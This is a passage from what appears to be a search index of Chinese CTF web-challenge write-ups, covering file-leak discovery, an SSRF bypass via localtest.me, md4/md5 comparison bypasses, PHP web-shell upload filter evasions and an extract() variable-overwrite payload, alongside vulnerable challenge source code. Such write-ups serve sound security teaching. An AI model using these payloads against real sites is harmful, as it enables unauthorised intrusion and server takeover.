\u5b58\u653e\u5177\u4f53\u6587\u4ef6\u53d8\u66f4\u7684 revlog \u6570\u636e</li> <li><code>phaseroots</code>, <code>obsstore</code>: \u53d8\u66f4\u5386\u53f2\u7684\u9ad8\u7ea7\u7279\u6027\u6570\u636e\uff08\u53ef\u80fd\u672a\u542f\u7528\uff09</li> <li>\u7ed3\u6784\uff1a\u4f7f\u7528 <code>.i</code>\uff08\u7d22\u5f15\uff09\u4e0e <code>.d</code>\uff08\u6570\u636e\uff09\u4e8c\u8fdb\u5236\u6587\u4ef6\u914d\u5bf9</li> <li>\u91cd\u8981\u6027\uff1a\u8fd9\u91cc\u5b58\u50a8\u4e86\u5168\u90e8\u7248\u672c\u6570\u636e\u3002\u5982\u679c\u88ab\u7834\u574f\uff0c\u4ed3\u5e93\u5f7b\u5e95\u5931\u6548</li> </ul> <p>9\ufe0f\u20e3 wcache/</p> <ul> <li>\u4f5c\u7528\uff1a<code>working directory cache</code></li> <li>\u5185\u5bb9\uff1a\u7f13\u5b58\u67d0\u4e9b\u5de5\u4f5c\u76ee\u5f55\u7684\u72b6\u6001\uff0c\u8f85\u52a9\u6027\u80fd</li> <li>\u5f71\u54cd\uff1a\u5220\u9664\u5b83\u4e0d\u4f1a\u4e22\u6570\u636e\uff0c\u53ea\u662f\u6027\u80fd\u4e0b\u964d\uff08\u4f1a\u91cd\u65b0\u751f\u6210\uff09</li> </ul> <p>\u62ff\u5230 flag \u540d</p> <p></p>"},{"location":"Web/Chapter1/1-2/","title":"JavaScript \u6e90\u7801\u6cc4\u9732","text":""},{"location":"Web/Chapter1/1-2/#javascript-\u6e90\u7801\u6cc4\u9732","title":"JavaScript \u6e90\u7801\u6cc4\u9732","text":"<p>\u6253\u5f00\u7f51\u9875\u662f\u4e00\u4e2a\u8f93\u5165\u6846</p> <p></p> <p>\u8fd9\u91cc\u8f93\u5165\u88ab\u9650\u5236\u4e86\u957f\u5ea6</p> <p>\u53ef\u4ee5\u901a\u8fc7\u524d\u7aef\u4fee\u6539 input \u6846\u7684 text \u7684 max-length \u503c</p> <p>\u4e5f\u53ef\u4ee5\u76f4\u63a5\u67e5\u770b JavaScript \u6e90\u4ee3\u7801\u62ff\u5230 flag</p> <p>\u5148\u67e5\u770b\u6e90\u7801</p> <p></p> <p>\u770b\u5230\u5f15\u5165\u4e86\u4e00\u4e2a code.js \u6587\u4ef6\uff08jquery \u662f\u6846\u67b6\u7684\u4e0d\u7528\u7ba1\uff09\u70b9\u51fb\u67e5\u770b\u4ee3\u7801\u62ff\u5230 flag</p> <p></p>"},{"location":"Web/Chapter1/1-3/","title":".git \u6587\u4ef6\u6cc4\u9732","text":""},{"location":"Web/Chapter1/1-3/#git-\u6587\u4ef6\u6cc4\u9732","title":".git \u6587\u4ef6\u6cc4\u9732","text":"<p>\u7f51\u9875\u5565\u4e5f\u6ca1\u6709\uff0c\u5148\u626b\u4ed6\u76ee\u5f55</p> <p></p> <p>\u6709\u4e2a flag.txt\uff0c\u4f46\u662f\u662f\u5047\u7684</p> <p></p> <p>\u8fd8\u6709\u4e2a .git \u6587\u4ef6\uff0c\u4e0b\u8f7d\u4e0b\u6765\u67e5\u770b</p> <p></p> <p>git show \u67e5\u770b\u5386\u53f2\u7248\u672c\u627e\u5230 flag</p> <p></p>"},{"location":"Web/Chapter1/1-4/","title":".bak \u6587\u4ef6\u6cc4\u9732","text":""},{"location":"Web/Chapter1/1-4/#bak-\u6587\u4ef6\u6cc4\u9732","title":".bak \u6587\u4ef6\u6cc4\u9732","text":"<p>\u6253\u5f00\u7f51\u9875\u662f\u4e2a md5</p> <p></p> <p>\u89e3\u5bc6\u5565\u4e5f\u4e0d\u662f</p> <p></p> <p>\u626b\u63cf\u540e\u53f0\u53d1\u73b0 .bak \u5907\u4efd\u6587\u4ef6</p> <p></p> <p>\u4e0b\u8f7d\u4e0b\u6765\u5f97\u5230\u7f51\u9875\u6e90\u7801</p> <p></p>"},{"location":"Web/Chapter1/1-5/","title":"robots.txt \u6587\u4ef6\u6cc4\u9732","text":""},{"location":"Web/Chapter1/1-5/#robotstxt-\u6587\u4ef6\u6cc4\u9732","title":"robots.txt \u6587\u4ef6\u6cc4\u9732","text":"<p>\u8bbf\u95ee\u9875\u9762\u5565\u4e5f\u6ca1\u6709</p> <p></p> <p>\u626b\u63cf\u540e\u53f0\u53ea\u6709\u4e00\u4e2a robots.txt \u6587\u4ef6</p> <p></p> <p>\u8bbf\u95ee\u5f97\u5230\u4e00\u4e2a\u7981\u6b62\u8bbf\u95ee\u7684 resusl.php</p> <p></p> <p>URL \u8ddf\u4e0a\u8bbf\u95ee\u7ed9\u51fa\u4e86\u4e00\u6bb5\u6e90\u4ee3\u7801</p> <p></p> <p>\u7ed3\u5408\u9898\u76ee\u540d\u79f0\u4f20\u53c2 x=admin \u62ff\u5230 flag</p> <p></p>"},{"location":"Web/Chapter1/1-6/","title":"SSL \u8bc1\u4e66\u6cc4\u9732","text":""},{"location":"Web/Chapter1/1-6/#ssl-\u8bc1\u4e66\u6cc4\u9732","title":"SSL \u8bc1\u4e66\u6cc4\u9732","text":"<p>\u9898\u76ee\u7ffb\u8bd1\u5c31\u95ee\u8fd9\u4e2a\u7f51\u7ad9\u4ec0\u4e48\u65f6\u5019\u4ece HTTP \u8f6c\u5230\u4e86 HTTPS</p> <p>\u5982\u679c\u81ea\u5df1\u642d\u5efa\u8fc7\u7f51\u7ad9\u540c\u5b66\u90fd\u77e5\u9053\uff0c\u7533\u8bf7 HTTPS \u662f\u9700\u8981 SSL \u8bc1\u4e66\u7684</p> <p>\u8fd9\u4e2a\u8bc1\u4e66\u53ef\u4ee5\u53bb\u5728\u7ebf\u7f51\u7ad9\u67e5\u8be2\u7684\uff0c\u53bb\u8fd9\u4e2a\u7f51\u7ad9\u67e5\u8be2\u57df\u540d\u53ef\u4ee5\u770b\u5230\u8bc1\u4e66\u4fe1\u606f</p> <p></p>"},{"location":"Web/Chapter1/1-7/","title":"\u7f51\u7ad9\u5386\u53f2\u4fe1\u606f\u6cc4\u9732","text":""},{"location":"Web/Chapter1/1-7/#\u7f51\u7ad9\u5386\u53f2\u4fe1\u606f\u6cc4\u9732","title":"\u7f51\u7ad9\u5386\u53f2\u4fe1\u606f\u6cc4\u9732","text":"<p>\u8003\u5bdf\u7684\u4fe1\u606f\u641c\u96c6\u80fd\u529b\uff0cweb.archive.org \u514d\u8d39\u63d0\u4f9b\u5168\u7403\u7f51\u7ad9\u5386\u53f2\u4fe1\u606f\u67e5\u8be2\u670d\u52a1\uff0c\u6700\u65e9\u53ef\u8ffd\u6eaf\u5230 1996 \u5e74</p> <p></p> <p>\u5177\u4f53\u9898\u76ee\u63d0\u4f9b\u7684\u65f6\u95f4\u67e5\u627e\u5feb\u7167</p> <p></p> <p>\u5f80\u4e0b\u7ffb\u62ff\u5230 flag</p> <p></p>"},{"location":"Web/Chapter1/1-8/","title":"JavaScript \u63a5\u53e3\u6cc4\u9732","text":""},{"location":"Web/Chapter1/1-8/#javascript-\u63a5\u53e3\u6cc4\u9732","title":"JavaScript \u63a5\u53e3\u6cc4\u9732","text":"<p>\u6253\u5f00\u7f51\u9875\u4e0d\u8ba9 F12 \u4ee5\u53ca\u53f3\u952e</p> <p></p> <p>Ctrl + U \u53d1\u73b0\u6709\u4e2a PHP \u6587\u4ef6</p> <p></p> <p>\u8bbf\u95ee\u9875\u9762\u540e\u518d\u6b21\u67e5\u770b\u6e90\u7801\u7ed9\u51fa\u4e86\u63d0\u793a</p> <p></p> <p>\u5b89\u88c5\u5de5\u5177</p> <pre><code>pip install arjun\n</code></pre> <p></p> <p>\u6267\u884c\u547d\u4ee4</p> <pre><code>arjun -u http://challenge.qsnctf.com:31303/c3s4f.php\n</code></pre> <p>\u53ef\u4ee5\u53d1\u73b0\u6709\u4e2a <code>shell</code> \u53c2\u6570</p> <p></p> <p>\u4f20\u5165\u53c2\u6570\u7ed9\u51fa\u4e86\u65b0\u63d0\u793a</p> <p></p> <p>\u626b\u63cf\u76ee\u5f55\u53d1\u73b0\u6709\u4e2a <code>secret.php</code></p> <p></p> <p>\u53ea\u5141\u8bb8\u672c\u5730\u8bbf\u95ee</p> <p></p> <p>\u7ed3\u5408\u63d0\u793a\u4ee5\u4e3a\u662f\u8981\u4f2a\u9020 XFF \u6216\u8005 Client-IP\uff0c\u8bd5\u8fc7\u4e86\u90fd\u4e0d\u884c</p> <p>\u5229\u7528 <code>shell</code> \u53c2\u6570\u6784\u9020 SSRF</p> <pre><code>?shell=http://127.0.0.1/secret.php\n</code></pre> <p>\u65e0\u679c</p> <p></p> <p>\u4f7f\u7528\u57df\u540d\u8df3\u8f6c\u7ed5\u8fc7</p> <pre><code>?shell=http://localtest.me/secret.php\n</code></pre> <p></p> <p>\u8bbf\u95ee\u62ff\u5230\u6e90\u7801</p> <p></p> <pre><code>&lt;?php\nshow_source(__FILE__);\ninclude('k4y.php');\ninclude_once('flag.php');\n\n\n// Challenge 1\nif (isset($_GET['DrKn'])) {\n    $text = $_GET['DrKn'];\n    if(@file_get_contents($text) == $key) {\n        echo \"\u6709\u70b9\u4e1c\u897f\u5462\".\"&lt;/br&gt;\".$key1.\"&lt;/br&gt;\";\n    } else {\n        die(\"\u8c8c\u4f3c\u72b6\u6001\u4e0d\u5728\u7ebf\u554a(\u256f_\u2570)&lt;/br&gt;\");\n    }\n} \n\n\n// Challenge 2\nif (isset($_GET[$key1])) {\n    $damei = $_GET[$key1];\n    if (hash(\"md4\", $damei) == $damei) {\n        echo \"\u53c8\u8fd1\u4e86\u4e00\u6b65\u5462\uff0c\u5b9d~\".\"&lt;/br&gt;\".$key2.\"&lt;/br&gt;\".$key3;\n    } else {\n        die(\"\u8fbe\u54a9\u54df~\");\n    }\n} \n\n\n// Challenge 3\nif (isset($_POST[$key2]) &amp;&amp; isset($_POST[$key3])) {\n    $user = $_POST[$key2];\n    $pass = $_POST[$key3];\n\n    if (strlen($user) &gt; 4 || strlen($pass) &gt; 5) {\n          die(\"\u8fd8\u5f97\u7ec3\");\n      }\n     if ($user !== $pass &amp;&amp; md5($user) === md5($pass)) {  \n          echo \"\u8fd8\u4e0d\u9519\u54e6\".\"$flag\";\n      }\n      else {\n          die(\"nonono\") ;\n      }\n    }\n\n?&gt;\n</code></pre> <p>\u7b2c\u4e00\u5173\u5c31\u662f\u4f20\u5165\u7ed9\u51fa\u7684 Key\uff0c\u4f46\u662f\u9700\u8981\u7528\u5230 <code>data</code> \u4f2a\u534f\u8bae</p> <p></p> <p>\u7b2c\u4e8c\u5173\u662f\u4e00\u4e2a <code>md4</code> \u7684\u5f31\u6bd4\u8f83\u7ed5\u8fc7\uff0c\u5176\u5b9e\u53ef\u4ee5\u901a\u8fc7\u79d1\u5b66\u8ba1\u7b97\u6cd5\u6bd4\u8f83\u7ed5\u8fc7</p> <p>\u4e5f\u5c31\u662f\u8bf4\u8981\u627e\u4e00\u4e2a\u660e\u6587\u662f\u4e00\u4e2a\u79d1\u5b66\u8ba1\u7b97\u6cd5 0e \u5f00\u5934\u7684\uff0c\u7136\u540e\u5176\u52a0\u5bc6\u4e5f\u662f 0e \u5f00\u5934\u540e\u9762\u90fd\u662f\u6570\u5b57</p> <pre><code>&amp;M_ore.8=0e001233333333333334557778889\n</code></pre> <p>\u6700\u540e\u4e00\u5173\u5c31\u662f <code>md5</code> \u5f3a\u6bd4\u8f83\u7ed5\u8fc7\uff0c\u90fd\u4e3a\u6570\u7ec4\u5373\u53ef</p> <p></p>"},{"location":"Web/Chapter1/1-9/","title":".swp \u6587\u4ef6\u6cc4\u9732","text":""},{"location":"Web/Chapter1/1-9/#swp-\u6587\u4ef6\u6cc4\u9732","title":".swp \u6587\u4ef6\u6cc4\u9732","text":"<p>\u5229\u7528 wget \u4e0b\u8f7d\u6587\u4ef6</p> <p>\u56e0\u4e3a vim \u4f7f\u7528\u7684\u7f13\u5b58\u5b58\u50a8\u4e3a\u4e00\u79cd<code>\u56fa\u5b9a\u683c\u5f0f\u7684\u4e8c\u8fdb\u5236\u6587\u4ef6</code>\uff0c\u800c\u6211\u4eec\u4e00\u822c\u7f16\u8f91\u7684\u65f6\u660e\u95ee\u53ef\u89c1\u5b57\u7b26\uff0c\u5728 vim \u7684\u7f13\u5b58\u4e2d\u8fd9\u4e9b\u53ef\u89c1\u5b57\u7b26\u4f1a\u539f\u6837\u4fdd\u7559</p> <p></p>"},{"location":"Web/Chapter10/10-1/","title":"JavaScript WebShell","text":""},{"location":"Web/Chapter10/10-1/#javascript-webshell","title":"JavaScript WebShell","text":"<p>\u6253\u5f00\u7f51\u9875\u5565\u4e5f\u6ca1\u6709</p> <p></p> <p>\u67e5\u770b\u6e90\u4ee3\u7801\u53d1\u73b0\u6ce8\u91ca</p> <p></p> <p>\u8bbf\u95ee\u662f\u4e00\u4e2a\u6587\u4ef6\u4e0a\u4f20</p> <p></p> <p>\u524d\u9762\u8bd5\u4e86\u5404\u79cd\u8fc7\u6ee4\u65b9\u6cd5</p> <p>\u8981\u4f7f\u7528 HTML \u6807\u7b7e\u5b9a\u4e49 PHP \u4e00\u53e5\u8bdd\u6728\u9a6c\uff0c\u6700\u540e\u4fdd\u5b58\u4e3a\u56fe\u7247\u6587\u4ef6\uff0c\u4efb\u610f\u5747\u53ef</p> <p></p> <p>\u4e0a\u4f20\u6587\u4ef6\u56de\u663e\u8def\u5f84</p> <p></p> <p>\u8bbf\u95ee\u8def\u5f84\u53ef\u4ee5\u770b\u5230\u547d\u4ee4\u88ab\u6267\u884c\u4e86</p> <p></p> <p>\u4e0a\u4f20\u4e00\u53e5\u8bdd\u6728\u9a6c</p> <p></p> <p>\u4f7f\u7528\u4e2d\u56fd\u8681\u5251\u8fde\u63a5</p> <p></p> <p>\u6210\u529f\u62ff\u5230 flag</p> <p></p>"},{"location":"Web/Chapter10/10-10/","title":".user.ini \u89e3\u6790\u7ed5\u8fc7","text":""},{"location":"Web/Chapter10/10-10/#userini-\u89e3\u6790\u7ed5\u8fc7","title":".user.ini \u89e3\u6790\u7ed5\u8fc7","text":"<p>\u6253\u5f00\u9875\u9762\u8003\u5bdf\u6587\u4ef6\u4e0a\u4f20</p> <p></p> <p><code>.user.ini</code> \u6587\u4ef6\u662f\u4e00\u4e2a\u914d\u7f6e\u6587\u4ef6\uff0c\u5e76\u4e14\u662f\u53ef\u4ee5\u7531\u7528\u6237\u81ea\u5b9a\u4e49\u7684</p> <p><code>php.ini</code> \u4e0d\u4e00\u6837\u7684\u662f\uff0c<code>.user.ini</code> \u53ef\u4ee5\u88ab\u52a8\u6001\u52a0\u8f7d\uff0c\u53ea\u9700\u8981\u7b49\u5f85\u4e00\u6bb5\u65f6\u95f4\u5c31\u4f1a\u5237\u65b0\u4e86</p> <p></p> <p>BurpSuite \u6293\u5305\u4fee\u6539 MIME \u7c7b\u578b\u518d\u4e0a\u4f20</p> <p></p> <p>\u518d\u4e0a\u4f20\u540c\u540d\u7684\u6728\u9a6c\u53d1\u73b0\u6709\u8fc7\u6ee4</p> <p></p> <p>\u4fee\u6539\u6728\u9a6c\u540e\u518d\u4e0a\u4f20</p> <p></p> <p>\u8bbf\u95ee\u7ed9\u51fa\u7684\u76ee\u5f55\u8def\u5f84\u4e0b\u7684 index.php \u62ff\u5230 flag</p> <p></p>"},{"location":"Web/Chapter10/10-11/","title":"Content-type \u5927\u5c0f\u5199\u6df7\u6dc6\u7ed5\u8fc7","text":""},{"location":"Web/Chapter10/10-11/#content-type-\u5927\u5c0f\u5199\u6df7\u6dc6\u7ed5\u8fc7","title":"Content-type \u5927\u5c0f\u5199\u6df7\u6dc6\u7ed5\u8fc7","text":"<p>\u6253\u5f00\u7f51\u9875\u6b63\u5e38\u7684\u6587\u4ef6\u4e0a\u4f20</p> <p></p> <p><code>strpos()</code> \u51fd\u6570\u67e5\u627e\u5b57\u7b26\u4e32\u5728\u53e6\u4e00\u5b57\u7b26\u4e32\u4e2d\u7b2c\u4e00\u6b21\u51fa\u73b0\u7684\u4f4d\u7f6e\uff08\u533a\u5206\u5927\u5c0f\u5199\uff09</p> <p>\u6240\u4ee5\u8fd9\u91cc\u4f7f\u7528\u5927\u5c0f\u5199\u6df7\u6dc6\u7ed5\u8fc7</p> <p></p> <p>\u5e38\u89c4\u7684 php \u540e\u7f00\u88ab\u66ff\u6362\uff0c\u6362\u6210 php4 \u53ef\u4ee5</p> <p>\u6700\u540e\u662f\u4fee\u6539 Content-Type \u7c7b\u578b\u4e3a\u56fe\u7247\u5373\u53ef</p> <p></p> <p>\u4e0a\u4f20\u6210\u529f</p> <p></p> <p>\u4f7f\u7528\u8681\u5251\u8fde\u63a5\u62ff\u5230 flag</p> <p></p>"},{"location":"Web/Chapter10/10-12/","title":"php4 \u540e\u7f00\u7ed5\u8fc7","text":""},{"location":"Web/Chapter10/10-12/#php4-\u540e\u7f00\u7ed5\u8fc7","title":"php4 \u540e\u7f00\u7ed5\u8fc7","text":"<p>\u6253\u5f00\u7f51\u9875\u6b63\u5e38\u7684\u6587\u4ef6\u4e0a\u4f20</p> <p></p> <p><code>strpos()</code> \u51fd\u6570\u67e5\u627e\u5b57\u7b26\u4e32\u5728\u53e6\u4e00\u5b57\u7b26\u4e32\u4e2d\u7b2c\u4e00\u6b21\u51fa\u73b0\u7684\u4f4d\u7f6e\uff08\u533a\u5206\u5927\u5c0f\u5199\uff09</p> <p>\u6240\u4ee5\u8fd9\u91cc\u4f7f\u7528\u5927\u5c0f\u5199\u6df7\u6dc6\u7ed5\u8fc7</p> <p></p> <p>\u5e38\u89c4\u7684 php \u540e\u7f00\u88ab\u66ff\u6362\uff0c\u6362\u6210 php4 \u53ef\u4ee5</p> <p>\u6700\u540e\u662f\u4fee\u6539 Content-Type \u7c7b\u578b\u4e3a\u56fe\u7247\u5373\u53ef</p> <p></p> <p>\u4e0a\u4f20\u6210\u529f</p> <p></p> <p>\u4f7f\u7528\u8681\u5251\u8fde\u63a5\u62ff\u5230 flag</p> <p></p>"},{"location":"Web/Chapter10/10-13/","title":"\u53c2\u6570\u7f6e\u7a7a\u7ed5\u8fc7","text":""},{"location":"Web/Chapter10/10-13/#\u53c2\u6570\u7f6e\u7a7a\u7ed5\u8fc7","title":"\u53c2\u6570\u7f6e\u7a7a\u7ed5\u8fc7","text":"<p>\u626b\u63cf\u76ee\u5f55\u53d1\u73b0\u6709\u4e2a <code>index.php.bak</code></p> <pre><code>&lt;?php \nerror_reporting(0);\n$token = $_COOKIE['token'] ?? null;\n\nif($token){\n    extract($_GET);\n    $token = base64_decode($token);\n    $token = json_decode($token, true);\n\n\n    $username = $token['username'];\n    $password = $token['password'];\n    $isLocal = false;\n\n    if($_SERVER['REMOTE_ADDR'] == \"127.0.0.1\"){\n        $isLocal = true;\n    }\n\n    if($isLocal){\n        echo 'Welcome Back\uff0c' . $username . '!';\n        if(file_exists('upload/' . $username . '/' . $token['filename'])){\n            echo '&lt;br&gt;';\n            echo '&lt;img src=\"upload/' . $username . '/' . $token['filename'] .'\" width=\"200\"&gt;';\n        } else {\n            echo '\u8bf7\u4e0a\u4f20\u60a8\u9ad8\u8d35\u7684\u5934\u50cf\u3002';\n            $html = &lt;&lt;&lt;EOD\n            &lt;form method=\"post\" action=\"upload.php\" enctype=\"multipart/form-data\"&gt;\n                &lt;input type=\"file\" name=\"file\" id=\"file\"&gt;\n                &lt;input type=\"submit\" value=\"Upload\"&gt;\n            &lt;/form&gt;\n            EOD;\n            echo $html;\n        }\n    } else {\n        // echo \"\u7559\u4e2a\u8a00\u5427\";\n        $html = &lt;&lt;&lt;EOD\n        &lt;h1&gt;\u7559\u8a00\u677f&lt;/h1&gt;\n        &lt;label for=\"input-text\"&gt;Enter some text:&lt;/label&gt;\n        &lt;input type=\"text\" id=\"input-text\" placeholder=\"Type here...\"&gt;\n        &lt;button onclick=\"displayInput()\"&gt;Display&lt;/button&gt;\n        EOD;\n        echo $html;\n    }\n} else {\n    $html = &lt;&lt;&lt;EOD\n&lt;!DOCTYPE html&gt;\n&lt;html&gt;\n&lt;head&gt;\n    &lt;title&gt;Login&lt;/title&gt;\n&lt;/head&gt;\n&lt;body&gt;\n    &lt;h2&gt;Login&lt;/h2&gt;\n    &lt;form method=\"post\" action=\"./login.php\"&gt;\n        &lt;div&gt;\n            &lt;label for=\"username\"&gt;Username:&lt;/label&gt;\n            &lt;input type=\"text\" name=\"username\" id=\"username\" required&gt;\n        &lt;/div&gt;\n        &lt;div&gt;\n            &lt;label for=\"password\"&gt;Password:&lt;/label&gt;\n            &lt;input type=\"password\" name=\"password\" id=\"password\" required&gt;\n        &lt;/div&gt;\n        &lt;div&gt;\n            &lt;input type=\"submit\" value=\"Login\"&gt;\n        &lt;/div&gt;\n    &lt;/form&gt;\n&lt;/body&gt;\n&lt;/html&gt;\nEOD;\n    echo $html;\n}\n?&gt;\n\n&lt;script&gt;\n    function displayInput() {\n      var inputText = document.getElementById(\"input-text\").value;\n      document.write(inputText)\n    }\n&lt;/script&gt;\n</code></pre> <p>\u4e3b\u8981\u529f\u80fd\u6d41\u7a0b\uff1a</p> <ol> <li>\u83b7\u53d6 Cookie \u4e2d\u7684 <code>token</code> \u503c</li> </ol> <pre><code>$token = $_COOKIE['token'] ?? null;\n</code></pre> <ol> <li>\u89e3\u6790 <code>token</code> \u5185\u5bb9</li> </ol> <pre><code>$token = base64_decode($token);\n$token = json_decode($token, true);\n</code></pre> <ol> <li>\u5224\u65ad\u8bbf\u95ee\u8005\u662f\u5426\u4e3a <code>127.0.0.1</code></li> </ol> <pre><code>if ($_SERVER['REMOTE_ADDR'] == \"127.0.0.1\")\n</code></pre> <ol> <li>\u672c\u5730\u7528\u6237\u529f\u80fd</li> </ol> <p>\u663e\u793a\u6b22\u8fce\u8bed\uff1b</p> <p>\u68c0\u67e5\u5934\u50cf\u6587\u4ef6\u662f\u5426\u5b58\u5728\uff1b</p> <p>\u82e5\u5b58\u5728\u5219\u5c55\u793a\u5934\u50cf\uff1b</p> <p>\u82e5\u4e0d\u5b58\u5728\u5219\u63d0\u793a\u4e0a\u4f20\u8868\u5355\uff08\u63d0\u4ea4\u5230 <code>upload.php</code>\uff09</p> <ol> <li>\u8fdc\u7a0b\u7528\u6237\u529f\u80fd\uff1a</li> </ol> <p>\u663e\u793a\u7559\u8a00\u677f\uff08\u524d\u7aef HTML + JS \u52a8\u6001\u5c55\u793a\uff09</p> <ol> <li>\u672a\u767b\u5f55\u7528\u6237</li> </ol> <p>\u663e\u793a\u767b\u5f55\u8868\u5355\uff0c\u63d0\u4ea4\u81f3 <code>login.php</code></p> <p>extract($_GET) \u5de5\u4f5c\u539f\u7406\uff1a</p> <pre><code>&lt;?php\nextract($_GET);\necho \"Hello, $name!\";\n?&gt;\n</code></pre> <p>\u8bf7\u6c42\uff1a</p> <pre><code>http://example.com/index.php?name=Alice\n</code></pre> <p>\u7ed3\u679c\uff1a</p> <pre><code>Hello, Alice!\n</code></pre> <p>\u53d8\u91cf\u6c61\u67d3\u653b\u51fb\uff1a</p> <pre><code>&lt;?php\n$token = \"secure-token\";\nextract($_GET);\necho \"Token is: $token\";\n?&gt;\n</code></pre> <p>\u8bf7\u6c42\uff1a</p> <pre><code>http://example.com/index.php?token=hacked\n</code></pre> <p>\u7ed3\u679c\uff1a</p> <pre><code>Token is: hacked\n</code></pre> <p><code>extract($GET);</code> \u5b58\u5728\u53d8\u91cf\u8986\u76d6\uff0c\u53ef\u4ee5\u5229\u7528\u8fd9\u4e2a\u628a <code>$SERVER['REMOTE_ADDR']</code> \u8986\u76d6\u6210 <code>127.0.0.1</code></p> <pre><code>?_SERVER[REMOTE_ADDR]=127.0.0.1\n</code></pre> <p>\u9996\u5148\u767b\u5f55</p> <p></p> <p>\u7136\u540e\u6c61\u67d3\u627e\u5230\u6587\u4ef6\u4e0a\u4f20\u70b9</p> <p></p> <p>\u4e0a\u4f20\u6210\u529f\u540e\u6ca1\u6709\u8fd4\u56de\u8def\u5f84\uff0c\u5728\u6e90\u7801\u4e0a\u53ef\u4ee5\u770b\u5230\u8fd9\u4e2a</p> <pre><code>if(file_exists('upload/' . $username . '/' . $token['filename']))\n</code></pre> <p>\u731c\u6d4b\u6587\u4ef6\u4e0a\u4f20\u5230 <code>/upload/[username]/[filename]</code>\uff0c\u5c1d\u8bd5\u53d1\u73b0\u662f\u6b63\u786e\u7684</p> <p>\u5f53\u5b58\u5728 <code>username</code> \u65f6\uff0c\u65e0\u8bba\u4e0a\u4f20\u4ec0\u4e48\u90fd\u4e0d\u80fd\u88ab\u89e3\u6790\u6210 PHP \u4ee3\u7801</p> <p>\u628a <code>username</code> \u7f6e\u7a7a\uff0c\u6210\u529f\u5c06\u6587\u4ef6\u4e0a\u4f20\u5230 upload \u76ee\u5f55</p> <pre><code>token=eyJ1c2VybmFtZSI6IiIsInBhc3N3b3JkIjoiIn0=\n</code></pre> <p></p>"},{"location":"Web/Chapter10/10-14/","title":"Apache \u591a\u540e\u7f00\u89e3\u6790\u6f0f\u6d1e","text":""},{"location":"Web/Chapter10/10-14/#apache-\u591a\u540e\u7f00\u89e3\u6790\u6f0f\u6d1e","title":"Apache \u591a\u540e\u7f00\u89e3\u6790\u6f0f\u6d1e","text":"<p>\u6253\u5f00\u7f51\u9875\u662f\u76f4\u63a5\u7ed9\u51fa\u4e86\u6e90\u7801</p> <pre><code>&lt;?php\nheader(\"Content-Type:text/html; charset=utf-8\");\n// \u6bcf5\u5206\u949f\u4f1a\u6e05\u9664\u4e00\u6b21\u76ee\u5f55\u4e0b\u4e0a\u4f20\u7684\u6587\u4ef6\nrequire_once('pclzip.lib.php');\n\nif(!$_FILES){\n\n        echo '\n\n&lt;!DOCTYPE html&gt;\n&lt;html lang=\"zh\"&gt;\n&lt;head&gt;\n    &lt;meta charset=\"UTF-8\" /&gt;\n    &lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\" /&gt;\n    &lt;meta http-equiv=\"X-UA-Compatible\" content=\"ie=edge\" /&gt;\n    &lt;title&gt;\u6587\u4ef6\u4e0a\u4f20\u7ae0\u8282\u7ec3\u4e60\u9898&lt;/title&gt;\n    &lt;link rel=\"stylesheet\" href=\"https://cdn.jsdelivr.net/npm/bootstrap@3.3.7/dist/css/bootstrap.min.css\" integrity=\"sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u\" crossorigin=\"anonymous\"&gt;\n    &lt;style type=\"text/css\"&gt;\n        .login-box{\n            margin-top: 100px;\n            height: 500px;\n            border: 1px solid #000;\n        }\n        body{\n            background: white;\n        }\n        .btn1{\n            width: 200px;\n        }\n        .d1{\n            display: block;\n            height: 400px;\n        }\n    &lt;/style&gt;\n&lt;/head&gt;\n&lt;body&gt;\n    &lt;div class=\"container\"&gt;\n        &lt;div class=\"login-box col-md-12\"&gt;\n        &lt;form class=\"form-horizontal\" method=\"post\" enctype=\"multipart/form-data\" &gt;\n            &lt;h1&gt;\u6587\u4ef6\u4e0a\u4f20\u7ae0\u8282\u7ec3\u4e60\u9898&lt;/h1&gt;\n            &lt;hr /&gt;\n            &lt;div class=\"form-group\"&gt;\n                &lt;label class=\"col-sm-2 control-label\"&gt;\u9009\u62e9\u6587\u4ef6\uff1a&lt;/label&gt;\n                &lt;div class=\"input-group col-sm-10\"&gt;\n                    &lt;div &gt;\n                    &lt;label for=\"\"&gt;\n                        &lt;input type=\"file\" name=\"file\" /&gt;\n                    &lt;/label&gt;\n                    &lt;/div&gt;\n                &lt;/div&gt;\n            &lt;/div&gt;\n\n        &lt;div class=\"col-sm-8  text-right\"&gt;\n            &lt;input type=\"submit\" class=\"btn btn-success text-right btn1\" /&gt;\n        &lt;/div&gt;\n        &lt;/form&gt;\n        &lt;/div&gt;\n    &lt;/div&gt;\n&lt;/body&gt;\n&lt;/html&gt;\n';\n\n    show_source(__FILE__);\n}else{\n    $file = $_FILES['file'];\n\n    if(!$file){\n        exit(\"\u8bf7\u52ff\u4e0a\u4f20\u7a7a\u6587\u4ef6\");\n    }\n    $name = $file['name'];\n\n    $dir = 'upload/';\n    $ext = strtolower(substr(strrchr($name, '.'), 1));\n    $path = $dir.$name;\n\n    function check_dir($dir){\n        $handle = opendir($dir);\n        while(($f = readdir($handle)) !== false){\n            if(!in_array($f, array('.', '..'))){\n                if(is_dir($dir.$f)){\n                    check_dir($dir.$f.'/');\n                 }else{\n                    $ext = strtolower(substr(strrchr($f, '.'), 1));\n                    if(!in_array($ext, array('jpg', 'gif', 'png'))){\n                        unlink($dir.$f);\n                    }\n                }\n\n            }\n        }\n    }\n\n    if(!is_dir($dir)){\n        mkdir($dir);\n    }\n\n    $temp_dir = $dir.md5(time(). rand(1000,9999));\n    if(!is_dir($temp_dir)){\n        mkdir($temp_dir);\n    }\n\n    if(in_array($ext, array('zip', 'jpg', 'gif', 'png'))){\n        if($ext == 'zip'){\n            $archive = new PclZip($file['tmp_name']);\n            foreach($archive-&gt;listContent() as $value){\n                $filename = $value[\"filename\"];\n                if(preg_match('/\\.php$/', $filename)){\n                     exit(\"\u538b\u7f29\u5305\u5185\u4e0d\u5141\u8bb8\u542b\u6709php\u6587\u4ef6!\");\n                 }\n            }\n            if ($archive-&gt;extract(PCLZIP_OPT_PATH, $temp_dir, PCLZIP_OPT_REPLACE_NEWER) == 0) {\n                check_dir($dir);\n                   exit(\"\u89e3\u538b\u5931\u8d25\");\n            }\n\n            check_dir($dir);\n            exit('\u4e0a\u4f20\u6210\u529f!');\n        }else{\n            move_uploaded_file($file['tmp_name'], $temp_dir.'/'.$file['name']);\n            check_dir($dir);\n            exit('\u4e0a\u4f20\u6210\u529f!');\n        }\n    }else{\n        